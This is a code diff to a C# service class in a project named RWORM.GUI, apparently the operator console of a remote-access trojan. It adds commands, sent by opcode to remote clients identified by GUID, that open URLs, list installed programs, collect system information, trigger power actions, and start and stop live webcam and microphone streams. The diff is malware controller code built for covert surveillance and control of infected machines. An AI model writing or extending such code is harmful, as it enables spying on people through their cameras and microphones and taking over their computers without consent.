@@ -395,6 +395,44 @@ namespace RWORM.GUI.Services
 
 
 
+        // ── URL & System Tools ───────────────────────────────────────────────
+        public Task OpenUrl(string guid, string url, Action<byte[]>? cb = null)
+        {
+            if (cb != null) RegisterHandler(guid, 0xD1, cb);
+            return GuiSend(0xD0, guid, Encoding.UTF8.GetBytes(url));
+        }
+
+        public void RegisterInstalledProgramsHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xD3, cb);
+        public void UnregisterInstalledProgramsHandler(string guid) => UnregisterHandler(guid, 0xD3);
+        public Task RequestInstalledPrograms(string guid) => GuiSend(0xD2, guid, Array.Empty<byte>());
+
+        public void RegisterSystemInfoHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xD5, cb);
+        public void UnregisterSystemInfoHandler(string guid) => UnregisterHandler(guid, 0xD5);
+        public Task RequestSystemInfoDetailed(string guid) => GuiSend(0xD4, guid, Array.Empty<byte>());
+
+        public Task SendPowerAction(string guid, string action, Action<byte[]>? cb = null)
+        {
+            if (cb != null) RegisterHandler(guid, 0xD7, cb);
+            return GuiSend(0xD6, guid, Encoding.UTF8.GetBytes(action));
+        }
+
+        // ── Webcam ────────────────────────────────────────────────────────────
+        public void RegisterWebcamDevicesHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xE1, cb);
+        public void UnregisterWebcamDevicesHandler(string guid) => UnregisterHandler(guid, 0xE1);
+        public Task RequestWebcamDevices(string guid) => GuiSend(0xE0, guid, Array.Empty<byte>());
+
+        public void RegisterWebcamFrameHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xE3, cb);
+        public void UnregisterWebcamFrameHandler(string guid) => UnregisterHandler(guid, 0xE3);
+        public Task StartWebcam(string guid, int deviceIndex = 0)
+            => GuiSend(0xE2, guid, Encoding.UTF8.GetBytes(deviceIndex.ToString()));
+        public Task StopWebcam(string guid) => GuiSend(0xE4, guid, Array.Empty<byte>());
+
+        // ── Audio ─────────────────────────────────────────────────────────────
+        public void RegisterAudioStreamHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xE6, cb);
+        public void UnregisterAudioStreamHandler(string guid) => UnregisterHandler(guid, 0xE6);
+        public Task StartAudio(string guid) => GuiSend(0xE5, guid, Array.Empty<byte>());
+        public Task StopAudio(string guid) => GuiSend(0xE7, guid, Array.Empty<byte>());
+
         // ── Client control ────────────────────────────────────────────────────
 
         public Task ClientClose(string guid)     => GuiSend(0xA0, guid, Array.Empty<byte>());
